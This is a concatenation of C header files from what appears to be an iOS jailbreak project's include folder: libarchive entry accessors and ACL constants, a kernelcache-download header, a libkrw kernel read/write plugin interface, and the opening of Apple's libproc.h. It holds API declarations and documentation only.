__LA_DECL long		 archive_entry_birthtime_nsec(struct archive_entry *);
__LA_DECL int		 archive_entry_birthtime_is_set(struct archive_entry *);
__LA_DECL time_t	 archive_entry_ctime(struct archive_entry *);
__LA_DECL long		 archive_entry_ctime_nsec(struct archive_entry *);
__LA_DECL int		 archive_entry_ctime_is_set(struct archive_entry *);
__LA_DECL dev_t		 archive_entry_dev(struct archive_entry *);
__LA_DECL int		 archive_entry_dev_is_set(struct archive_entry *);
__LA_DECL dev_t		 archive_entry_devmajor(struct archive_entry *);
__LA_DECL dev_t		 archive_entry_devminor(struct archive_entry *);
__LA_DECL __LA_MODE_T	 archive_entry_filetype(struct archive_entry *);
__LA_DECL void		 archive_entry_fflags(struct archive_entry *,
				unsigned long * /* set */,
				unsigned long * /* clear */);
__LA_DECL const char	*archive_entry_fflags_text(struct archive_entry *);
__LA_DECL la_int64_t	 archive_entry_gid(struct archive_entry *);
__LA_DECL const char	*archive_entry_gname(struct archive_entry *);
__LA_DECL const char	*archive_entry_gname_utf8(struct archive_entry *);
__LA_DECL const wchar_t	*archive_entry_gname_w(struct archive_entry *);
__LA_DECL const char	*archive_entry_hardlink(struct archive_entry *);
__LA_DECL const char	*archive_entry_hardlink_utf8(struct archive_entry *);
__LA_DECL const wchar_t	*archive_entry_hardlink_w(struct archive_entry *);
__LA_DECL la_int64_t	 archive_entry_ino(struct archive_entry *);
__LA_DECL la_int64_t	 archive_entry_ino64(struct archive_entry *);
__LA_DECL int		 archive_entry_ino_is_set(struct archive_entry *);
__LA_DECL __LA_MODE_T	 archive_entry_mode(struct archive_entry *);
__LA_DECL time_t	 archive_entry_mtime(struct archive_entry *);
__LA_DECL long		 archive_entry_mtime_nsec(struct archive_entry *);
__LA_DECL int		 archive_entry_mtime_is_set(struct archive_entry *);
__LA_DECL unsigned int	 archive_entry_nlink(struct archive_entry *);
__LA_DECL const char	*archive_entry_pathname(struct archive_entry *);
__LA_DECL const char	*archive_entry_pathname_utf8(struct archive_entry *);
__LA_DECL const wchar_t	*archive_entry_pathname_w(struct archive_entry *);
__LA_DECL __LA_MODE_T	 archive_entry_perm(struct archive_entry *);
__LA_DECL dev_t		 archive_entry_rdev(struct archive_entry *);
__LA_DECL dev_t		 archive_entry_rdevmajor(struct archive_entry *);
__LA_DECL dev_t		 archive_entry_rdevminor(struct archive_entry *);
__LA_DECL const char	*archive_entry_sourcepath(struct archive_entry *);
__LA_DECL const wchar_t	*archive_entry_sourcepath_w(struct archive_entry *);
__LA_DECL la_int64_t	 archive_entry_size(struct archive_entry *);
__LA_DECL int		 archive_entry_size_is_set(struct archive_entry *);
__LA_DECL const char	*archive_entry_strmode(struct archive_entry *);
__LA_DECL const char	*archive_entry_symlink(struct archive_entry *);
__LA_DECL const char	*archive_entry_symlink_utf8(struct archive_entry *);
__LA_DECL int		 archive_entry_symlink_type(struct archive_entry *);
__LA_DECL const wchar_t	*archive_entry_symlink_w(struct archive_entry *);
__LA_DECL la_int64_t	 archive_entry_uid(struct archive_entry *);
__LA_DECL const char	*archive_entry_uname(struct archive_entry *);
__LA_DECL const char	*archive_entry_uname_utf8(struct archive_entry *);
__LA_DECL const wchar_t	*archive_entry_uname_w(struct archive_entry *);
__LA_DECL int archive_entry_is_data_encrypted(struct archive_entry *);
__LA_DECL int archive_entry_is_metadata_encrypted(struct archive_entry *);
__LA_DECL int archive_entry_is_encrypted(struct archive_entry *);

/*
 * Set fields in an archive_entry.
 *
 * Note: Before libarchive 2.4, there were 'set' and 'copy' versions
 * of the string setters.  'copy' copied the actual string, 'set' just
 * stored the pointer.  In libarchive 2.4 and later, strings are
 * always copied.
 */

__LA_DECL void	archive_entry_set_atime(struct archive_entry *, time_t, long);
__LA_DECL void  archive_entry_unset_atime(struct archive_entry *);
#if defined(_WIN32) && !defined(__CYGWIN__)
__LA_DECL void archive_entry_copy_bhfi(struct archive_entry *, BY_HANDLE_FILE_INFORMATION *);
#endif
__LA_DECL void	archive_entry_set_birthtime(struct archive_entry *, time_t, long);
__LA_DECL void  archive_entry_unset_birthtime(struct archive_entry *);
__LA_DECL void	archive_entry_set_ctime(struct archive_entry *, time_t, long);
__LA_DECL void  archive_entry_unset_ctime(struct archive_entry *);
__LA_DECL void	archive_entry_set_dev(struct archive_entry *, dev_t);
__LA_DECL void	archive_entry_set_devmajor(struct archive_entry *, dev_t);
__LA_DECL void	archive_entry_set_devminor(struct archive_entry *, dev_t);
__LA_DECL void	archive_entry_set_filetype(struct archive_entry *, unsigned int);
__LA_DECL void	archive_entry_set_fflags(struct archive_entry *,
		unsigned long /* set */, unsigned long /* clear */);
/* Returns pointer to start of first invalid token, or NULL if none. */
/* Note that all recognized tokens are processed, regardless. */
__LA_DECL const char *archive_entry_copy_fflags_text(struct archive_entry *,
		const char *);
__LA_DECL const wchar_t *archive_entry_copy_fflags_text_w(struct archive_entry *,
		const wchar_t *);
__LA_DECL void	archive_entry_set_gid(struct archive_entry *, la_int64_t);
__LA_DECL void	archive_entry_set_gname(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_set_gname_utf8(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_copy_gname(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_copy_gname_w(struct archive_entry *, const wchar_t *);
__LA_DECL int	archive_entry_update_gname_utf8(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_set_hardlink(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_set_hardlink_utf8(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_copy_hardlink(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_copy_hardlink_w(struct archive_entry *, const wchar_t *);
__LA_DECL int	archive_entry_update_hardlink_utf8(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_set_ino(struct archive_entry *, la_int64_t);
__LA_DECL void	archive_entry_set_ino64(struct archive_entry *, la_int64_t);
__LA_DECL void	archive_entry_set_link(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_set_link_utf8(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_copy_link(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_copy_link_w(struct archive_entry *, const wchar_t *);
__LA_DECL int	archive_entry_update_link_utf8(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_set_mode(struct archive_entry *, __LA_MODE_T);
__LA_DECL void	archive_entry_set_mtime(struct archive_entry *, time_t, long);
__LA_DECL void  archive_entry_unset_mtime(struct archive_entry *);
__LA_DECL void	archive_entry_set_nlink(struct archive_entry *, unsigned int);
__LA_DECL void	archive_entry_set_pathname(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_set_pathname_utf8(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_copy_pathname(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_copy_pathname_w(struct archive_entry *, const wchar_t *);
__LA_DECL int	archive_entry_update_pathname_utf8(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_set_perm(struct archive_entry *, __LA_MODE_T);
__LA_DECL void	archive_entry_set_rdev(struct archive_entry *, dev_t);
__LA_DECL void	archive_entry_set_rdevmajor(struct archive_entry *, dev_t);
__LA_DECL void	archive_entry_set_rdevminor(struct archive_entry *, dev_t);
__LA_DECL void	archive_entry_set_size(struct archive_entry *, la_int64_t);
__LA_DECL void	archive_entry_unset_size(struct archive_entry *);
__LA_DECL void	archive_entry_copy_sourcepath(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_copy_sourcepath_w(struct archive_entry *, const wchar_t *);
__LA_DECL void	archive_entry_set_symlink(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_set_symlink_type(struct archive_entry *, int);
__LA_DECL void	archive_entry_set_symlink_utf8(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_copy_symlink(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_copy_symlink_w(struct archive_entry *, const wchar_t *);
__LA_DECL int	archive_entry_update_symlink_utf8(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_set_uid(struct archive_entry *, la_int64_t);
__LA_DECL void	archive_entry_set_uname(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_set_uname_utf8(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_copy_uname(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_copy_uname_w(struct archive_entry *, const wchar_t *);
__LA_DECL int	archive_entry_update_uname_utf8(struct archive_entry *, const char *);
__LA_DECL void	archive_entry_set_is_data_encrypted(struct archive_entry *, char is_encrypted);
__LA_DECL void	archive_entry_set_is_metadata_encrypted(struct archive_entry *, char is_encrypted);
/*
 * Routines to bulk copy fields to/from a platform-native "struct
 * stat."  Libarchive used to just store a struct stat inside of each
 * archive_entry object, but this created issues when trying to
 * manipulate archives on systems different than the ones they were
 * created on.
 *
 * TODO: On Linux and other LFS systems, provide both stat32 and
 * stat64 versions of these functions and all of the macro glue so
 * that archive_entry_stat is magically defined to
 * archive_entry_stat32 or archive_entry_stat64 as appropriate.
 */
__LA_DECL const struct stat	*archive_entry_stat(struct archive_entry *);
__LA_DECL void	archive_entry_copy_stat(struct archive_entry *, const struct stat *);

/*
 * Storage for Mac OS-specific AppleDouble metadata information.
 * Apple-format tar files store a separate binary blob containing
 * encoded metadata with ACL, extended attributes, etc.
 * This provides a place to store that blob.
 */

__LA_DECL const void * archive_entry_mac_metadata(struct archive_entry *, size_t *);
__LA_DECL void archive_entry_copy_mac_metadata(struct archive_entry *, const void *, size_t);

/*
 * Digest routine. This is used to query the raw hex digest for the
 * given entry. The type of digest is provided as an argument.
 */
#define ARCHIVE_ENTRY_DIGEST_MD5              0x00000001
#define ARCHIVE_ENTRY_DIGEST_RMD160           0x00000002
#define ARCHIVE_ENTRY_DIGEST_SHA1             0x00000003
#define ARCHIVE_ENTRY_DIGEST_SHA256           0x00000004
#define ARCHIVE_ENTRY_DIGEST_SHA384           0x00000005
#define ARCHIVE_ENTRY_DIGEST_SHA512           0x00000006

__LA_DECL const unsigned char * archive_entry_digest(struct archive_entry *, int /* type */);

/*
 * ACL routines.  This used to simply store and return text-format ACL
 * strings, but that proved insufficient for a number of reasons:
 *   = clients need control over uname/uid and gname/gid mappings
 *   = there are many different ACL text formats
 *   = would like to be able to read/convert archives containing ACLs
 *     on platforms that lack ACL libraries
 *
 *  This last point, in particular, forces me to implement a reasonably
 *  complete set of ACL support routines.
 */

/*
 * Permission bits.
 */
#define	ARCHIVE_ENTRY_ACL_EXECUTE             0x00000001
#define	ARCHIVE_ENTRY_ACL_WRITE               0x00000002
#define	ARCHIVE_ENTRY_ACL_READ                0x00000004
#define	ARCHIVE_ENTRY_ACL_READ_DATA           0x00000008
#define	ARCHIVE_ENTRY_ACL_LIST_DIRECTORY      0x00000008
#define	ARCHIVE_ENTRY_ACL_WRITE_DATA          0x00000010
#define	ARCHIVE_ENTRY_ACL_ADD_FILE            0x00000010
#define	ARCHIVE_ENTRY_ACL_APPEND_DATA         0x00000020
#define	ARCHIVE_ENTRY_ACL_ADD_SUBDIRECTORY    0x00000020
#define	ARCHIVE_ENTRY_ACL_READ_NAMED_ATTRS    0x00000040
#define	ARCHIVE_ENTRY_ACL_WRITE_NAMED_ATTRS   0x00000080
#define	ARCHIVE_ENTRY_ACL_DELETE_CHILD        0x00000100
#define	ARCHIVE_ENTRY_ACL_READ_ATTRIBUTES     0x00000200
#define	ARCHIVE_ENTRY_ACL_WRITE_ATTRIBUTES    0x00000400
#define	ARCHIVE_ENTRY_ACL_DELETE              0x00000800
#define	ARCHIVE_ENTRY_ACL_READ_ACL            0x00001000
#define	ARCHIVE_ENTRY_ACL_WRITE_ACL           0x00002000
#define	ARCHIVE_ENTRY_ACL_WRITE_OWNER         0x00004000
#define	ARCHIVE_ENTRY_ACL_SYNCHRONIZE         0x00008000

#define	ARCHIVE_ENTRY_ACL_PERMS_POSIX1E			\
	(ARCHIVE_ENTRY_ACL_EXECUTE			\
		| ARCHIVE_ENTRY_ACL_WRITE			\
		| ARCHIVE_ENTRY_ACL_READ)

#define ARCHIVE_ENTRY_ACL_PERMS_NFS4			\
	(ARCHIVE_ENTRY_ACL_EXECUTE			\
		| ARCHIVE_ENTRY_ACL_READ_DATA		\
		| ARCHIVE_ENTRY_ACL_LIST_DIRECTORY 		\
		| ARCHIVE_ENTRY_ACL_WRITE_DATA		\
		| ARCHIVE_ENTRY_ACL_ADD_FILE		\
		| ARCHIVE_ENTRY_ACL_APPEND_DATA		\
		| ARCHIVE_ENTRY_ACL_ADD_SUBDIRECTORY	\
		| ARCHIVE_ENTRY_ACL_READ_NAMED_ATTRS	\
		| ARCHIVE_ENTRY_ACL_WRITE_NAMED_ATTRS	\
		| ARCHIVE_ENTRY_ACL_DELETE_CHILD		\
		| ARCHIVE_ENTRY_ACL_READ_ATTRIBUTES		\
		| ARCHIVE_ENTRY_ACL_WRITE_ATTRIBUTES	\
		| ARCHIVE_ENTRY_ACL_DELETE			\
		| ARCHIVE_ENTRY_ACL_READ_ACL		\
		| ARCHIVE_ENTRY_ACL_WRITE_ACL		\
		| ARCHIVE_ENTRY_ACL_WRITE_OWNER		\
		| ARCHIVE_ENTRY_ACL_SYNCHRONIZE)

/*
 * Inheritance values (NFS4 ACLs only); included in permset.
 */
#define	ARCHIVE_ENTRY_ACL_ENTRY_INHERITED                   0x01000000
#define	ARCHIVE_ENTRY_ACL_ENTRY_FILE_INHERIT                0x02000000
#define	ARCHIVE_ENTRY_ACL_ENTRY_DIRECTORY_INHERIT           0x04000000
#define	ARCHIVE_ENTRY_ACL_ENTRY_NO_PROPAGATE_INHERIT        0x08000000
#define	ARCHIVE_ENTRY_ACL_ENTRY_INHERIT_ONLY                0x10000000
#define	ARCHIVE_ENTRY_ACL_ENTRY_SUCCESSFUL_ACCESS           0x20000000
#define	ARCHIVE_ENTRY_ACL_ENTRY_FAILED_ACCESS               0x40000000

#define	ARCHIVE_ENTRY_ACL_INHERITANCE_NFS4			\
	(ARCHIVE_ENTRY_ACL_ENTRY_FILE_INHERIT			\
		| ARCHIVE_ENTRY_ACL_ENTRY_DIRECTORY_INHERIT		\
		| ARCHIVE_ENTRY_ACL_ENTRY_NO_PROPAGATE_INHERIT	\
		| ARCHIVE_ENTRY_ACL_ENTRY_INHERIT_ONLY		\
		| ARCHIVE_ENTRY_ACL_ENTRY_SUCCESSFUL_ACCESS		\
		| ARCHIVE_ENTRY_ACL_ENTRY_FAILED_ACCESS		\
		| ARCHIVE_ENTRY_ACL_ENTRY_INHERITED)

/* We need to be able to specify combinations of these. */
#define	ARCHIVE_ENTRY_ACL_TYPE_ACCESS	0x00000100  /* POSIX.1e only */
#define	ARCHIVE_ENTRY_ACL_TYPE_DEFAULT	0x00000200  /* POSIX.1e only */
#define	ARCHIVE_ENTRY_ACL_TYPE_ALLOW	0x00000400 /* NFS4 only */
#define	ARCHIVE_ENTRY_ACL_TYPE_DENY	0x00000800 /* NFS4 only */
#define	ARCHIVE_ENTRY_ACL_TYPE_AUDIT	0x00001000 /* NFS4 only */
#define	ARCHIVE_ENTRY_ACL_TYPE_ALARM	0x00002000 /* NFS4 only */
#define	ARCHIVE_ENTRY_ACL_TYPE_POSIX1E	(ARCHIVE_ENTRY_ACL_TYPE_ACCESS \
		| ARCHIVE_ENTRY_ACL_TYPE_DEFAULT)
#define	ARCHIVE_ENTRY_ACL_TYPE_NFS4	(ARCHIVE_ENTRY_ACL_TYPE_ALLOW \
		| ARCHIVE_ENTRY_ACL_TYPE_DENY \
		| ARCHIVE_ENTRY_ACL_TYPE_AUDIT \
		| ARCHIVE_ENTRY_ACL_TYPE_ALARM)

/* Tag values mimic POSIX.1e */
#define	ARCHIVE_ENTRY_ACL_USER		10001	/* Specified user. */
#define	ARCHIVE_ENTRY_ACL_USER_OBJ 	10002	/* User who owns the file. */
#define	ARCHIVE_ENTRY_ACL_GROUP		10003	/* Specified group. */
#define	ARCHIVE_ENTRY_ACL_GROUP_OBJ	10004	/* Group who owns the file. */
#define	ARCHIVE_ENTRY_ACL_MASK		10005	/* Modify group access (POSIX.1e only) */
#define	ARCHIVE_ENTRY_ACL_OTHER		10006	/* Public (POSIX.1e only) */
#define	ARCHIVE_ENTRY_ACL_EVERYONE	10107   /* Everyone (NFS4 only) */

/*
 * Set the ACL by clearing it and adding entries one at a time.
 * Unlike the POSIX.1e ACL routines, you must specify the type
 * (access/default) for each entry.  Internally, the ACL data is just
 * a soup of entries.  API calls here allow you to retrieve just the
 * entries of interest.  This design (which goes against the spirit of
 * POSIX.1e) is useful for handling archive formats that combine
 * default and access information in a single ACL list.
 */
__LA_DECL void	 archive_entry_acl_clear(struct archive_entry *);
__LA_DECL int	 archive_entry_acl_add_entry(struct archive_entry *,
		int /* type */, int /* permset */, int /* tag */,
		int /* qual */, const char * /* name */);
__LA_DECL int	 archive_entry_acl_add_entry_w(struct archive_entry *,
		int /* type */, int /* permset */, int /* tag */,
		int /* qual */, const wchar_t * /* name */);

/*
 * To retrieve the ACL, first "reset", then repeatedly ask for the
 * "next" entry.  The want_type parameter allows you to request only
 * certain types of entries.
 */
__LA_DECL int	 archive_entry_acl_reset(struct archive_entry *, int /* want_type */);
__LA_DECL int	 archive_entry_acl_next(struct archive_entry *, int /* want_type */,
		int * /* type */, int * /* permset */, int * /* tag */,
		int * /* qual */, const char ** /* name */);

/*
 * Construct a text-format ACL.  The flags argument is a bitmask that
 * can include any of the following:
 *
 * Flags only for archive entries with POSIX.1e ACL:
 * ARCHIVE_ENTRY_ACL_TYPE_ACCESS - Include POSIX.1e "access" entries.
 * ARCHIVE_ENTRY_ACL_TYPE_DEFAULT - Include POSIX.1e "default" entries.
 * ARCHIVE_ENTRY_ACL_STYLE_MARK_DEFAULT - Include "default:" before each
 *    default ACL entry.
 * ARCHIVE_ENTRY_ACL_STYLE_SOLARIS - Output only one colon after "other" and
 *    "mask" entries.
 *
 * Flags only for archive entries with NFSv4 ACL:
 * ARCHIVE_ENTRY_ACL_STYLE_COMPACT - Do not output the minus character for
 *    unset permissions and flags in NFSv4 ACL permission and flag fields
 *
 * Flags for for archive entries with POSIX.1e ACL or NFSv4 ACL:
 * ARCHIVE_ENTRY_ACL_STYLE_EXTRA_ID - Include extra numeric ID field in
 *    each ACL entry.
 * ARCHIVE_ENTRY_ACL_STYLE_SEPARATOR_COMMA - Separate entries with comma
 *    instead of newline.
 */
#define	ARCHIVE_ENTRY_ACL_STYLE_EXTRA_ID	0x00000001
#define	ARCHIVE_ENTRY_ACL_STYLE_MARK_DEFAULT	0x00000002
#define	ARCHIVE_ENTRY_ACL_STYLE_SOLARIS		0x00000004
#define	ARCHIVE_ENTRY_ACL_STYLE_SEPARATOR_COMMA	0x00000008
#define	ARCHIVE_ENTRY_ACL_STYLE_COMPACT		0x00000010

__LA_DECL wchar_t *archive_entry_acl_to_text_w(struct archive_entry *,
		la_ssize_t * /* len */, int /* flags */);
__LA_DECL char *archive_entry_acl_to_text(struct archive_entry *,
		la_ssize_t * /* len */, int /* flags */);
__LA_DECL int archive_entry_acl_from_text_w(struct archive_entry *,
		const wchar_t * /* wtext */, int /* type */);
__LA_DECL int archive_entry_acl_from_text(struct archive_entry *,
		const char * /* text */, int /* type */);

/* Deprecated constants */
#define	OLD_ARCHIVE_ENTRY_ACL_STYLE_EXTRA_ID		1024
#define	OLD_ARCHIVE_ENTRY_ACL_STYLE_MARK_DEFAULT	2048

/* Deprecated functions */
__LA_DECL const wchar_t	*archive_entry_acl_text_w(struct archive_entry *,
			int /* flags */) __LA_DEPRECATED;
__LA_DECL const char *archive_entry_acl_text(struct archive_entry *,
			int /* flags */) __LA_DEPRECATED;

/* Return bitmask of ACL types in an archive entry */
__LA_DECL int	 archive_entry_acl_types(struct archive_entry *);

/* Return a count of entries matching 'want_type' */
__LA_DECL int	 archive_entry_acl_count(struct archive_entry *, int /* want_type */);

/* Return an opaque ACL object. */
/* There's not yet anything clients can actually do with this... */
struct archive_acl;
__LA_DECL struct archive_acl *archive_entry_acl(struct archive_entry *);

/*
 * extended attributes
 */

__LA_DECL void	 archive_entry_xattr_clear(struct archive_entry *);
__LA_DECL void	 archive_entry_xattr_add_entry(struct archive_entry *,
		const char * /* name */, const void * /* value */,
		size_t /* size */);

/*
 * To retrieve the xattr list, first "reset", then repeatedly ask for the
 * "next" entry.
 */

__LA_DECL int	archive_entry_xattr_count(struct archive_entry *);
__LA_DECL int	archive_entry_xattr_reset(struct archive_entry *);
__LA_DECL int	archive_entry_xattr_next(struct archive_entry *,
		const char ** /* name */, const void ** /* value */, size_t *);

/*
 * sparse
 */

__LA_DECL void	 archive_entry_sparse_clear(struct archive_entry *);
__LA_DECL void	 archive_entry_sparse_add_entry(struct archive_entry *,
		la_int64_t /* offset */, la_int64_t /* length */);

/*
 * To retrieve the xattr list, first "reset", then repeatedly ask for the
 * "next" entry.
 */

__LA_DECL int	archive_entry_sparse_count(struct archive_entry *);
__LA_DECL int	archive_entry_sparse_reset(struct archive_entry *);
__LA_DECL int	archive_entry_sparse_next(struct archive_entry *,
		la_int64_t * /* offset */, la_int64_t * /* length */);

/*
 * Utility to match up hardlinks.
 *
 * The 'struct archive_entry_linkresolver' is a cache of archive entries
 * for files with multiple links.  Here's how to use it:
 *   1. Create a lookup object with archive_entry_linkresolver_new()
 *   2. Tell it the archive format you're using.
 *   3. Hand each archive_entry to archive_entry_linkify().
 *      That function will return 0, 1, or 2 entries that should
 *      be written.
 *   4. Call archive_entry_linkify(resolver, NULL) until
 *      no more entries are returned.
 *   5. Call archive_entry_linkresolver_free(resolver) to free resources.
 *
 * The entries returned have their hardlink and size fields updated
 * appropriately.  If an entry is passed in that does not refer to
 * a file with multiple links, it is returned unchanged.  The intention
 * is that you should be able to simply filter all entries through
 * this machine.
 *
 * To make things more efficient, be sure that each entry has a valid
 * nlinks value.  The hardlink cache uses this to track when all links
 * have been found.  If the nlinks value is zero, it will keep every
 * name in the cache indefinitely, which can use a lot of memory.
 *
 * Note that archive_entry_size() is reset to zero if the file
 * body should not be written to the archive.  Pay attention!
 */
struct archive_entry_linkresolver;

/*
 * There are three different strategies for marking hardlinks.
 * The descriptions below name them after the best-known
 * formats that rely on each strategy:
 *
 * "Old cpio" is the simplest, it always returns any entry unmodified.
 *    As far as I know, only cpio formats use this.  Old cpio archives
 *    store every link with the full body; the onus is on the dearchiver
 *    to detect and properly link the files as they are restored.
 * "tar" is also pretty simple; it caches a copy the first time it sees
 *    any link.  Subsequent appearances are modified to be hardlink
 *    references to the first one without any body.  Used by all tar
 *    formats, although the newest tar formats permit the "old cpio" strategy
 *    as well.  This strategy is very simple for the dearchiver,
 *    and reasonably straightforward for the archiver.
 * "new cpio" is trickier.  It stores the body only with the last
 *    occurrence.  The complication is that we might not
 *    see every link to a particular file in a single session, so
 *    there's no easy way to know when we've seen the last occurrence.
 *    The solution here is to queue one link until we see the next.
 *    At the end of the session, you can enumerate any remaining
 *    entries by calling archive_entry_linkify(NULL) and store those
 *    bodies.  If you have a file with three links l1, l2, and l3,
 *    you'll get the following behavior if you see all three links:
 *           linkify(l1) => NULL   (the resolver stores l1 internally)
 *           linkify(l2) => l1     (resolver stores l2, you write l1)
 *           linkify(l3) => l2, l3 (all links seen, you can write both).
 *    If you only see l1 and l2, you'll get this behavior:
 *           linkify(l1) => NULL
 *           linkify(l2) => l1
 *           linkify(NULL) => l2   (at end, you retrieve remaining links)
 *    As the name suggests, this strategy is used by newer cpio variants.
 *    It's noticeably more complex for the archiver, slightly more complex
 *    for the dearchiver than the tar strategy, but makes it straightforward
 *    to restore a file using any link by simply continuing to scan until
 *    you see a link that is stored with a body.  In contrast, the tar
 *    strategy requires you to rescan the archive from the beginning to
 *    correctly extract an arbitrary link.
 */

__LA_DECL struct archive_entry_linkresolver *archive_entry_linkresolver_new(void);
__LA_DECL void archive_entry_linkresolver_set_strategy(
	struct archive_entry_linkresolver *, int /* format_code */);
__LA_DECL void archive_entry_linkresolver_free(struct archive_entry_linkresolver *);
__LA_DECL void archive_entry_linkify(struct archive_entry_linkresolver *,
	struct archive_entry **, struct archive_entry **);
__LA_DECL struct archive_entry *archive_entry_partial_links(
	struct archive_entry_linkresolver *res, unsigned int *links);
#ifdef __cplusplus
}
#endif

/* This is meaningless outside of this header. */
#undef __LA_DECL

#endif /* !ARCHIVE_ENTRY_H_INCLUDED */

```

`BaseBin/_external/include/libgrabkernel2/libgrabkernel2.h`:

```h
//
//  grabkernel.h
//  libgrabkernel2
//
//  Created by Alfie on 14/02/2024.
//

#ifndef grabkernel_h
#define grabkernel_h

#include <Foundation/Foundation.h>

bool download_kernelcache(NSString *zipURL, bool isOTA, NSString *outPath);
bool grab_kernelcache(NSString *outPath);

// libgrabkernel compatibility shim
// Note that research kernel grabbing is not currently supported
int grabkernel(char *downloadPath, int isResearchKernel);

#endif /* grabkernel_h */

```

`BaseBin/_external/include/libkrw/libkrw_plugin.h`:

```h
#ifndef LIBKRW_PLUGIN_H
#define LIBKRW_PLUGIN_H

#ifdef __cplusplus
extern "C" {
#endif

#include <stddef.h>
#include <stdint.h>

/**
 * libkrw - Library for kernel read/write
 *
 * The purpose of this library is to provide a standard interface for common
 * kernel memory operations. Subsets of those have historically been exported
 * by most jailbreaks, but the provided interfaces are increasingly shifting,
 * thus calling for a standard interface.
 *
 * It is understood that hardly any jailbreak provides the necessary primitives
 * to implement ALL of the below functions. Thus, an implementer of this API
 * is free to implement any subset of their choosing, even an empty one, and
 * simply "stub" the remaining functions to return `ENOTSUP` unconditionally.
 *
 * All functions imported by this library are expected to return an `int` status
 * code, where:
 * - The value `0` indicates success.
 * - The values `1` through `255` indicate failure and correspond to their
 *   definitions in <errno.h> (or are reserved, if no such definition exists).
 * - All other return values are implementation-defined, but indicate failure.
 *
 * Notable conditions where values from <errno.h> should be used include:
 * - `EPERM`    The requested operation requires root, an entitlement, or some
 *              other form of elevated privileges.
 * - `EINVAL`   An invalid argument was provided to the function.
 * - `EDEVERR`  The requested operation is supported in this implementation, but
 *              could not be completed for some reason.
 * - `ENOTSUP`  The requested operation is not supported in this implementation.
 *
 * Further shall be noted that due to the inherently unsafe nature of direct
 * kernel memory accesses, functions that take kernel addresses as arguments
 * from the caller may panic the kernel, and implementers of this interface may
 * choose to defend against that, but are not expected to do so. They ARE
 * however expected to defend against causing kernel panics in functions that do
 * NOT take kernel addresses as arguments.
**/

typedef int (*krw_kbase_func_t)(uint64_t *addr);
typedef int (*krw_kread_func_t)(uint64_t from, void *to, size_t len);
typedef int (*krw_kwrite_func_t)(void *from, uint64_t to, size_t len);
typedef int (*krw_kmalloc_func_t)(uint64_t *addr, size_t size);
typedef int (*krw_kdealloc_func_t)(uint64_t addr, size_t size);
typedef int (*krw_kcall_func_t)(uint64_t func, size_t argc, const uint64_t *argv, uint64_t *ret);
typedef int (*krw_physread_func_t)(uint64_t from, void *to, size_t len, uint8_t granule);
typedef int (*krw_physwrite_func_t)(void *from, uint64_t to, size_t len, uint8_t granule);

// This struct must only be extended so that old plugins can still load
#define LIBKRW_HANDLERS_VERSION 0
struct krw_handlers_s {
    uint64_t version;
    krw_kbase_func_t kbase;
    krw_kread_func_t kread;
    krw_kwrite_func_t kwrite;
    krw_kmalloc_func_t kmalloc;
    krw_kdealloc_func_t kdealloc;
    krw_kcall_func_t kcall;
    krw_physread_func_t physread;
    krw_physwrite_func_t physwrite;
};

typedef struct krw_handlers_s* krw_handlers_t;

/**
 * krw_initializer_t - plugin initialization prototype
 *
 * Called krw_initializer_t krw_initializer is called when a plugin is opened to
 * determine if read/write primitives are available
 *
 * krw_initializer should set as many of handlers->kread, handlers->kwrite, handlers->kbase,
 * handlers->kmalloc, and handlers->kdealloc as possible on success - any not set will
 * return unsupported.
 *
 * Called krw_initializer_t kcall_initializer is called when a plugin is opened to
 * determine if read/write primitives are available.  It is passed a structure containing
 * populated kread/kwrite functions
 *
 * kcall_initializer should set as many of handlers->kcall, handlers->physread, and
 * handlers->physwrite as possible on success.  any not set will return unsupported.
 *
 * Retuns 0 if read/write are supported by this plugin
**/
typedef int (*krw_plugin_initializer_t)(krw_handlers_t handlers);

#ifdef __cplusplus
}
#endif

#endif

```

`BaseBin/_external/include/libproc.h`:

```h
/*
 * Copyright (c) 2006, 2007, 2010 Apple Inc. All rights reserved.
 *
 * @APPLE_LICENSE_HEADER_START@
 * 
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this
 * file.
 * 
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 * 
 * @APPLE_LICENSE_HEADER_END@
 */
#ifndef _LIBPROC_H_
#define _LIBPROC_H_

#include <sys/cdefs.h>
#include <sys/param.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/resource.h>
#include <stdint.h>
#include <stdbool.h>

#include <Availability.h>

/*
 * This header file contains private interfaces to obtain process information.  
 * These interfaces are subject to change in future releases.
 */

/*!
	@define PROC_LISTPIDSPATH_PATH_IS_VOLUME
	@discussion This flag indicates that all processes that hold open
		file references on the volume associated with the specified
		path should be returned.
 */
#define PROC_LISTPIDSPATH_PATH_IS_VOLUME	1


/*!
	@define PROC_LISTPIDSPATH_EXCLUDE_EVTONLY
